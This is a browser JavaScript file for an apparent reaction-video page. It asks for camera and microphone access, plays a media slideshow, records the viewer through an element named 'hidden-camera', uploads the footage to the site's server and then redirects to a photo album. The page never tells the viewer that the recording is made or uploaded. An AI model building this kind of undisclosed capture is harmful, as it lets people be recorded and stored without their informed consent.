const config = window.APP_CONFIG;

const startScreen = document.getElementById("start-screen");
const viewerScreen = document.getElementById("viewer-screen");
const finalScreen = document.getElementById("final-screen");

const startButton = document.getElementById("start-button");
const albumButton = document.getElementById("album-button");

const imageViewer = document.getElementById("image-viewer");
const videoViewer = document.getElementById("video-viewer");
const hiddenCamera = document.getElementById("hidden-camera");

// 1. variável compartilhada no topo
let uploadPromise = null;
let recorder;
let recordedChunks = [];
let stream;

// 2. Para o recorder logo após a sequência terminar, antes de mostrar a tela final
startButton.addEventListener("click", async () => {
    try {
        stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: "user", width: 640, height: 480 },
            audio: true
        });

        hiddenCamera.srcObject = stream;
        startRecording(stream);

        startScreen.classList.remove("active");
        viewerScreen.classList.add("active");

        await playMediaSequence();

        recorder.stop(); // ← para aqui, dispara onstop → upload começa

        viewerScreen.classList.remove("active");
        finalScreen.classList.add("active");

    } catch (error) {
        console.error(error);
        alert("Permita câmera e microfone para continuar.");
    }
});

// 1. Remove o setTimeout de startRecording — só inicia, sem temporizador
function startRecording(stream) {

    let mimeType = "video/webm";
    if (!MediaRecorder.isTypeSupported(mimeType)) mimeType = "";

    recorder = new MediaRecorder(stream, mimeType ? { mimeType } : undefined);

    recorder.ondataavailable = event => {
        if (event.data.size > 0) recordedChunks.push(event.data);
    };

    let resolveUploadDone;
    window._uploadDone = new Promise(resolve => { resolveUploadDone = resolve; });

    recorder.onstop = async () => {
        const blob = new Blob(recordedChunks, { type: mimeType || "video/mp4" });
        await uploadVideo(blob);
        stream.getTracks().forEach(track => track.stop());
        resolveUploadDone();
    };

    recorder.start();
    // ← sem setTimeout aqui
}

async function playMediaSequence() {

    for (const item of config.MEDIA) {

        if (item.type === "image") {
            await showImage(item.src, item.duration);
        }

        if (item.type === "video") {
            await showVideo(item.src);
        }
    }

    viewerScreen.classList.remove("active");
    finalScreen.classList.add("active");
}

function showImage(src, duration) {

    return new Promise(resolve => {

        videoViewer.pause();
        videoViewer.style.display = "none";

        imageViewer.src = src;
        imageViewer.style.display = "block";

        setTimeout(resolve, duration);
    });
}

function showVideo(src) {

    return new Promise(resolve => {

        imageViewer.style.display = "none";

        videoViewer.src = src;
        videoViewer.style.display = "block";

        videoViewer.onended = () => {
            resolve();
        };

        videoViewer.play();
    });
}

async function uploadVideo(blob) {

    try {

        const formData = new FormData();

        formData.append(
            "video",
            blob,
            `reaction-${Date.now()}.webm`
        );

        await fetch("/api/upload", {
            method: "POST",
            body: formData
        });

    } catch (error) {

        console.error("Erro ao enviar vídeo:", error);
    }
}

// 3. Album button aguarda o upload terminar
albumButton.addEventListener("click", async () => {
    albumButton.disabled = true;
    albumButton.textContent = "Aguarde...";
    await window._uploadDone;
    window.location.href = config.GOOGLE_PHOTOS_URL;
});